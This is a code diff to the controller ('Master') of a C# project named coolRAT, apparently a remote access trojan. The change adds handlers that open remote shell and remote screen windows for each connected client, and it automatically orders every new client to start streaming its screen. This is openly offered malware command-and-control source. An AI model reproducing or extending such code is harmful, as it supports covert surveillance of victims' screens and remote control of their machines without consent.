@@ -24,28 +24,30 @@ namespace coolRAT.Master
             server.OnClientConnected += (s, e) =>
             {
                 ConnectedClients.Add(e.Client.UniqueId, e.Client);
-                e.Client.ClientPingService.Start(PingServiceType.Passive);
                 e.Client.ClientPingService.ConnectionLost += ClientPingService_ConnectionLost;
-                /*e.Client.RegisterPacketHandler("ShellConnectedPacket", (s_, e_) =>
+                Task.Run(() => e.Client.ClientPingService.Start(PingServiceType.Passive));
+                e.Client.RegisterPacketHandler("ShellConnectedPacket", (s_, e_) =>
                 {
                     if (e_.Packet.Type != "ShellConnectedPacket")
                         return;
                     ShellConnectedPacket shellConnectedPacket = ShellConnectedPacket.Deserialize(e_.RawPacket);
                     ShellWindow shellWindow = new ShellWindow(shellConnectedPacket.ShellUniqueId, e.Client);
                     Task.Run(() => shellWindow.ShowDialog());
-                });*/
-                // Spawn a new shell
-                Thread.Sleep(10000);
-                //Console.WriteLine($"Told client {e.Client.UniqueId} to spawn a new shell.");
-                //ConnectShellPacket packet = new ConnectShellPacket(e.Client.UniqueId);
-                //e.Client.SendPacket(packet);
-                e.Client.RegisterPacketHandler("ScreenFrame", (s_, e_) =>
-                {
-                    ScreenFrame frame = ScreenFrame.Deserialize(e_.RawPacket);
-                    frame.Frame.Save("test.png");
                 });
-                RequestFramePacketTemporary requestFramePacketTemporary = new RequestFramePacketTemporary(e.Client.UniqueId);
-                e.Client.SendPacket(requestFramePacketTemporary);
+                e.Client.RegisterPacketHandler("ScreenConnectedPacket", (s_, e_) =>
+                {
+                    if (e_.Packet.Type != "ScreenConnectedPacket")
+                        return;
+                    ScreenConnectedPacket screenConnectedPacket = ScreenConnectedPacket.Deserialize(e_.RawPacket);
+                    ScreenWindow screenWindow = new ScreenWindow(screenConnectedPacket.UniqueScreenId, e.Client);
+                    Task.Run(() => screenWindow.ShowDialog());
+                });
+                // Spawn a new shell
+                Thread.Sleep(2000);
+                Console.WriteLine($"Told client {e.Client.UniqueId} to spawn a new screen.");
+                //ConnectShellPacket packet = new ConnectShellPacket(e.Client.UniqueId);
+                ConnectScreenPacket packet = new ConnectScreenPacket(e.Client.UniqueId);
+                e.Client.SendPacket(packet);
             };
             server.Start();
             Console.WriteLine("Client Authorization Protocol server version 1.0.0.0 started");
@@ -58,6 +60,7 @@ namespace coolRAT.Master
             e.Client.ClientPingService.Stop();
             e.Client.Connection.StopAll();
             ConnectedClients.Remove(e.Client.UniqueId);
+            Console.WriteLine($"Lost connection with client {e.Client.UniqueId}");
         }
     }
 }
